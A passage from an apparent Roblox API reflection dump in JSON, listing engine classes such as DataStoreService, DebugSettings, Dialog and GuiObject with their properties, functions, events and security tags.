efault":null}],"Name":"getButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"Arguments":[{"Name":"button","Type":"Button"}],"Name":"ButtonChanged","tags":[],"Class":"Controller","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"HumanoidController","tags":[]},{"Superclass":"Controller","type":"Class","Name":"SkateboardController","tags":[]},{"ValueType":"float","type":"Property","Name":"Steer","tags":["readonly"],"Class":"SkateboardController"},{"ValueType":"float","type":"Property","Name":"Throttle","tags":["readonly"],"Class":"SkateboardController"},{"Arguments":[{"Name":"axis","Type":"string"}],"Name":"AxisChanged","tags":[],"Class":"SkateboardController","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"VehicleController","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ControllerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"CookiesService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"DeleteCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"CustomEvent","tags":["deprecated"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetAttachedReceivers","tags":[],"Class":"CustomEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"newValue","Default":null}],"Name":"SetValue","tags":[],"Class":"CustomEvent","type":"Function"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverConnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverDisconnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CustomEventReceiver","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Source","tags":[],"Class":"CustomEventReceiver"},{"ReturnType":"float","Arguments":[],"Name":"GetCurrentValue","tags":[],"Class":"CustomEventReceiver","type":"Function"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventConnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventDisconnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"newValue","Type":"float"}],"Name":"SourceValueChanged","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DataModelMesh","tags":["notbrowsable"]},{"ValueType":"Vector3","type":"Property","Name":"Offset","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"Scale","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"VertexColor","tags":[],"Class":"DataModelMesh"},{"Superclass":"DataModelMesh","type":"Class","Name":"BevelMesh","tags":["deprecated","notbrowsable"]},{"Superclass":"BevelMesh","type":"Class","Name":"BlockMesh","tags":[]},{"Superclass":"BevelMesh","type":"Class","Name":"CylinderMesh","tags":[]},{"Superclass":"DataModelMesh","type":"Class","Name":"FileMesh","tags":[]},{"ValueType":"Content","type":"Property","Name":"MeshId","tags":[],"Class":"FileMesh"},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"FileMesh"},{"Superclass":"FileMesh","type":"Class","Name":"SpecialMesh","tags":[]},{"ValueType":"MeshType","type":"Property","Name":"MeshType","tags":[],"Class":"SpecialMesh"},{"Superclass":"Instance","type":"Class","Name":"DataStoreService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"LegacyNamingScheme","tags":["LocalUserSecurity"],"Class":"DataStoreService"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGlobalDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetOrderedDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Debris","tags":[]},{"ValueType":"int","type":"Property","Name":"MaxItems","tags":["deprecated"],"Class":"Debris"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"AddItem","tags":[],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetLegacyMaxItems","tags":["LocalUserSecurity"],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"addItem","tags":["deprecated"],"Class":"Debris","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebugSettings","tags":["notbrowsable"]},{"ValueType":"int","type":"Property","Name":"AltCdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AltCdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AvailablePhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"BlockMeshSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"CPU","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"CdnResponceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuSpeed","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"DataModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ElapsedTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"ErrorReporting","type":"Property","Name":"ErrorReporting","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"GfxCard","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"InstanceCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsFmodProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsScriptStackTracingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"JobCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"LastCdnFailureTimeSpan","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"LuaRamLimit","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"OsIs64Bit","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsPlatform","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"OsPlatformId","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsVer","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFaultsPerSecond","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFileBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"PixelShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PlayerCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateWorkingSetBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProcessCores","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"ProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProfilingWindow","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RAM","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportExtendedMachineConfiguration","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportSoundWarnings","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"Resolution","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"RobloxRespoceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxVersion","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SIMD","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SystemProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"TickCountSampleMethod","type":"Property","Name":"TickCountPreciseOverride","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalPhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"VertexShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VideoMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VirtualBytes","tags":["readonly"],"Class":"DebugSettings"},{"ReturnType":"void","Arguments":[],"Name":"LegacyScriptMode","tags":["LocalUserSecurity","deprecated"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"ResetCdnFailureCounts","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBlockingRemove","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebuggerBreakpoint","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Condition","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"bool","type":"Property","Name":"IsEnabled","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"int","type":"Property","Name":"Line","tags":["readonly"],"Class":"DebuggerBreakpoint"},{"Superclass":"Instance","type":"Class","Name":"DebuggerManager","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"DebuggingEnabled","tags":["readonly"],"Class":"DebuggerManager"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"script","Default":null}],"Name":"AddDebugger","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableDebugging","tags":["LocalUserSecurity"],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetDebuggers","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":[],"Class":"DebuggerManager","type":"Function"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerAdded","tags":[],"Class":"DebuggerManager","type":"Event"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerRemoved","tags":[],"Class":"DebuggerManager","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DebuggerWatch","tags":[]},{"ValueType":"string","type":"Property","Name":"Expression","tags":[],"Class":"DebuggerWatch"},{"ReturnType":"void","Arguments":[],"Name":"CheckSyntax","tags":[],"Class":"DebuggerWatch","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Dialog","tags":[]},{"ValueType":"float","type":"Property","Name":"ConversationDistance","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"Dialog"},{"ValueType":"bool","type":"Property","Name":"InUse","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"InitialPrompt","tags":[],"Class":"Dialog"},{"ValueType":"DialogPurpose","type":"Property","Name":"Purpose","tags":[],"Class":"Dialog"},{"ValueType":"DialogTone","type":"Property","Name":"Tone","tags":[],"Class":"Dialog"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Instance","Name":"dialogChoice","Default":null}],"Name":"SignalDialogChoiceSelected","tags":["RobloxScriptSecurity"],"Class":"Dialog","type":"Function"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"dialogChoice","Type":"Instance"}],"Name":"DialogChoiceSelected","tags":[],"Class":"Dialog","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DialogChoice","tags":[]},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"ResponseDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"UserDialog","tags":[],"Class":"DialogChoice"},{"Superclass":"Instance","type":"Class","Name":"DoubleConstrainedValue","tags":[]},{"ValueType":"double","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MaxValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MinValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"DoubleConstrainedValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"DoubleConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"DoubleConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Dragger","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Axis","Name":"axis","Default":"X"}],"Name":"AxisRotate","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"mousePart","Default":null},{"Type":"Vector3","Name":"pointOnMousePart","Default":null},{"Type":"Objects","Name":"parts","Default":null}],"Name":"MouseDown","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Ray","Name":"mouseRay","Default":null}],"Name":"MouseMove","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MouseUp","tags":[],"Class":"Dragger","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Explosion","tags":[]},{"ValueType":"float","type":"Property","Name":"BlastPressure","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"BlastRadius","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"DestroyJointRadiusPercent","tags":[],"Class":"Explosion"},{"ValueType":"ExplosionType","type":"Property","Name":"ExplosionType","tags":[],"Class":"Explosion"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Explosion"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"distance","Type":"float"}],"Name":"Hit","tags":[],"Class":"Explosion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"FaceInstance","tags":["notbrowsable"]},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"FaceInstance"},{"Superclass":"FaceInstance","type":"Class","Name":"Decal","tags":[]},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Shiny","tags":["deprecated"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Specular","tags":["deprecated"],"Class":"Decal"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"Decal"},{"Superclass":"Decal","type":"Class","Name":"Texture","tags":[]},{"ValueType":"float","type":"Property","Name":"StudsPerTileU","tags":[],"Class":"Texture"},{"ValueType":"float","type":"Property","Name":"StudsPerTileV","tags":[],"Class":"Texture"},{"Superclass":"Instance","type":"Class","Name":"Feature","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"FaceId","tags":[],"Class":"Feature"},{"ValueType":"InOut","type":"Property","Name":"InOut","tags":[],"Class":"Feature"},{"ValueType":"LeftRight","type":"Property","Name":"LeftRight","tags":[],"Class":"Feature"},{"ValueType":"TopBottom","type":"Property","Name":"TopBottom","tags":[],"Class":"Feature"},{"Superclass":"Feature","type":"Class","Name":"Hole","tags":["deprecated"]},{"Superclass":"Feature","type":"Class","Name":"MotorFeature","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Fire","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Fire"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Heat","tags":[],"Class":"Fire"},{"ValueType":"Color3","type":"Property","Name":"SecondaryColor","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"size","tags":["deprecated"],"Class":"Fire"},{"Superclass":"Instance","type":"Class","Name":"FlagStandService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FlyweightService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"CSGDictionaryService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"NonReplicatedCSGDictionaryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Folder","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ForceField","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FriendService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBreakFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetCreateFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetDeleteFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetEnabled","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFriendsOnlineUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetGetFriendsUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetMakeFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"FunctionalTest","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"FunctionalTest"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Error","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Failed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Pass","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Passed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Warn","tags":[],"Class":"FunctionalTest","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"GamePassService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"playerHasPassUrl","Default":null}],"Name":"SetPlayerHasPassUrl","tags":["LocalUserSecurity"],"Class":"GamePassService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null}],"Name":"PlayerHasPass","tags":[],"Class":"GamePassService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GameSettings","tags":["notbrowsable"]},{"ValueType":"float","type":"Property","Name":"BubbleChatLifetime","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"BubbleChatMaxBubbles","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatScrollLength","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"CollisionSoundEnabled","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"float","type":"Property","Name":"CollisionSoundVolume","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"HardwareMouse","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"MaxCollisionSounds","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ReportAbuseChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoftwareSound","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoundEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"VideoCaptureEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"VideoQualitySettings","type":"Property","Name":"VideoQuality","tags":[],"Class":"GameSettings"},{"Arguments":[{"Name":"recording","Type":"bool"}],"Name":"VideoRecordingChangeRequest","tags":["RobloxScriptSecurity"],"Class":"GameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"GamepadService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Geometry","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GlobalDataStore","tags":[]},{"ReturnType":"Connection","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"callback","Default":null}],"Name":"OnUpdate","tags":[],"Class":"GlobalDataStore","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"int","Name":"delta","Default":"1"}],"Name":"IncrementAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"transformFunction","Default":null}],"Name":"UpdateAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"Superclass":"GlobalDataStore","type":"Class","Name":"OrderedDataStore","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"bool","Name":"ascending","Default":null},{"Type":"int","Name":"pagesize","Default":null},{"Type":"Variant","Name":"minValue","Default":null},{"Type":"Variant","Name":"maxValue","Default":null}],"Name":"GetSortedAsync","tags":[],"Class":"OrderedDataStore","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GroupService","tags":["notCreatable"]},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetAlliesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetEnemiesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetGroupInfoAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGroupsAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GuiBase","tags":[]},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase2d","tags":["notbrowsable"]},{"ValueType":"Vector2","type":"Property","Name":"AbsolutePosition","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteSize","tags":["readonly"],"Class":"GuiBase2d"},{"Superclass":"GuiBase2d","type":"Class","Name":"GuiObject","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BackgroundColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BackgroundColor3","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"BackgroundTransparency","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BorderColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BorderColor3","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"BorderSizePixel","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"ClipsDescendants","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Draggable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionDown","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionLeft","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionRight","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionUp","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Position","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Rotation","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Selectable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"GuiObject"},{"ValueType":"SizeConstraint","type":"Property","Name":"SizeConstraint","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":["hidden"],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"GuiObject"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenPosition","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSize","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSizeAndPosition","tags":[],"Class":"GuiObject","type":"Function"},{"Arguments":[{"Name":"initialPosition","Type":"UDim2"}],"Name":"DragBegin","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"DragStopped","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputBegan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputChanged","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputEnded","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"N